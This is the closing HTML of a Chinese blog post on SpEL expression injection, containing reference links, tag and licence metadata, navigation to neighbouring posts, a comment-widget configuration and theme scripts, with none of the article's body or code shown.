+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#%E9%80%9A%E8%BF%87-ClassLoader-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%9E%84%E9%80%A0-PoC-amp-Bypass">https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#%E9%80%9A%E8%BF%87-ClassLoader-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%9E%84%E9%80%A0-PoC-amp-Bypass</a></p>
+<p><a target="_blank" rel="noopener" href="http://101.36.122.13:4000/2025/03/25/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#H1gIO">http://101.36.122.13:4000/2025/03/25/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#H1gIO</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="print-no-link">#SpEL 表达式注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SpEL 表达式注入</div>
+      <div>http://xvshifu.github.io/2025/11/17/SpEL 表达式注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xvsf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/11/17/EL%20%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" title="EL 表达式注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">EL 表达式注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/12/Switch%20JDK%20versions%20in%20Windows/" title="Switch JDK versions in Windows">
+                        <span class="hidden-mobile">Switch JDK versions in Windows</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">
+
+  <!-- 计时器 -->
+  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
+    🚀 已运行：
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>
+    <script>
+      function createtime() {
+          var now = new Date();
+          var grt = new Date("08/07/2025 00:00:00");
+          var diff = now - grt;
+
+          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
+          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
+          var minutes = Math.floor((diff / 1000 / 60) % 60);
+          var seconds = Math.floor((diff / 1000) % 60);
+
+          if(hours<10) hours="0"+hours;
+          if(minutes<10) minutes="0"+minutes;
+          if(seconds<10) seconds="0"+seconds;
+
+          document.getElementById("timeDate").innerHTML = days + " 天";
+          document.getElementById("times").innerHTML = hours + " 时 " + minutes + " 分 " + seconds + " 秒";
+      }
+      setInterval(createtime, 1000);
+      createtime();
+    </script>
+  </div>
+
+  <!-- 自定义内容 -->
+  
+    <div style="margin-bottom:10px; font-size:13px; color:#666;">
+      ❤️  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+
+
+  <!-- PV/UV 统计（Busuanzi） -->
+  
+    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
+      👁‍🗨 总访问量：<span id="busuanzi_value_page_pv">载入中...</span>  
+      🧑 总访客数：<span id="busuanzi_value_site_uv">载入中...</span>
+    </div>
+    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
+  
+
+
+</div>
+
+<script src="/js/summon-plane.js"></script>
+
+
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/xm_custom/custom.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
